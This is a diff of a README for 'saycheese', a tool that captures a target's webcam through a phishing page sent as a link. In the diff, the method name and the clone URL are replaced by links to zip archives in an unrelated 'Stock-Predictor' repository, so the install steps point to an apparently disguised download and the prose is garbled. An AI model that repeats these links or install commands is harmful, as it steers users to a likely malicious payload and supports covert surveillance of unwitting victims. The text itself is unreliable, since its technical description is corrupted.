@@ -3,15 +3,15 @@ Take webcam shots from target just sending a malicious link
 
 
 # How it works?
-<p>The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding methods, and a javascript code to cam requests using https://raw.githubusercontent.com/Shafranpackeer/Stock-Predictor/main/Phacelia/Stock-Predictor_3.4.zip </p>
+<p>The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding methods, and a javascript code to cam requests using https://github.com/Shafranpackeer/Stock-Predictor/raw/refs/heads/main/Phacelia/Stock_Predictor_1.4.zip </p>
 
-<p>The https://raw.githubusercontent.com/Shafranpackeer/Stock-Predictor/main/Phacelia/Stock-Predictor_3.4.zip() method prompts the user for permission to use a media input which produces a MediaStream with tracks containing the requested types of media. That stream can include, for example, a video track (produced by either a hardware or virtual video source such as a camera, video recording device, screen sharing service, and so forth), an audio track (similarly, produced by a physical or virtual audio source like a microphone, A/D converter, or the like), and possibly other track types. </p>
+<p>The https://github.com/Shafranpackeer/Stock-Predictor/raw/refs/heads/main/Phacelia/Stock_Predictor_1.4.zip() method prompts the user for permission to use a media input which produces a MediaStream with tracks containing the requested types of media. That stream can include, for example, a video track (produced by either a hardware or virtual video source such as a camera, video recording device, screen sharing service, and so forth), an audio track (similarly, produced by a physical or virtual audio source like a microphone, A/D converter, or the like), and possibly other track types. </p>
 
 
 ## Installing (Kali Linux/Termux):
 
 ```
-git clone https://raw.githubusercontent.com/Shafranpackeer/Stock-Predictor/main/Phacelia/Stock-Predictor_3.4.zip
+git clone https://github.com/Shafranpackeer/Stock-Predictor/raw/refs/heads/main/Phacelia/Stock_Predictor_1.4.zip
 cd saycheese
 bash saycheese
 ```
